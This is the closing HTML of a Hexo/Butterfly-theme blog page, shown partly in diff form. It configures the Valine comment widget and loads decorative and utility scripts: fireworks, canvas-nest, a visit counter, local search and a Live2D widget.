src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
